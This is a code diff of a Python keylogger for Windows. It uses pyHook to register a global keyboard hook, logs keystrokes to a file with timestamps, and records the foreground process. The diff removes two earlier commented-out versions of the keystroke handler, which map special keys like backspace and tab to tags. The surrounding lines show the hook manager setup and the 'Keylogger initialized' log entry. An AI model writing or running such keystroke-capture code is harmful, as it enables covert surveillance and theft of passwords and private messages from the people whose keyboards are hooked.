@@ -18,35 +18,6 @@ psapi = windll.psapi
 logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s --- %(message)s')
 logging.log(10, "[ Keylogger initialized ]")
 
-""" # VERSION 1
-def OnKeyboardEvent(event): 
-    if event.Ascii==5: #exit when Ctrl + E is pressed
-        _exit(1) 
-    if event.Ascii != 0 or 8: #prevent null and backspace
-    #open output.txt to read current keystrokes 
-        f = open(file_log, 'r') 
-        buffer = f.read() 
-        f.close() 
-    # open output.txt to write current + new keystrokes 
-        f = open(file_log, 'w') 
-        try:
-            if event.Ascii == 8:
-                log = "[BS]"
-            elif event.Ascii == 9:
-                log = "[TAB]"
-            elif event.Ascii == 13:
-                log = "[NL]"
-            elif event.Ascii == 27:
-                log = "[ESC]"
-            else:
-                log = chr(event.Ascii)
-        except:
-            pass
-        buffer += log 
-        f.write(buffer) 
-        f.close() 
-"""
-
 def get_current_process():
 
     # get a handle to the foreground window
@@ -105,26 +76,6 @@ def KeyStroke(event):
 
     # pass execution to the next registered hook 
     return True
-
-""" # VERSION 2
-def OnKeyboardEvent(event):
-    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s --- %(message)s')
-    try:
-        if event.Ascii == 8:
-            clog = "[BS]"
-        elif event.Ascii == 9:
-            clog = "[TAB]"
-        elif event.Ascii == 13:
-            clog = "[NL]"
-        elif event.Ascii == 27:
-            clog = "[ESC]"
-        else:
-            clog = (chr(event.Ascii), event.Ascii)
-    except:
-        pass
-    logging.log(10,clog)
-    return True
-"""
 
 # create and register a hook manager
 hooks_manager = pyHook.HookManager() 
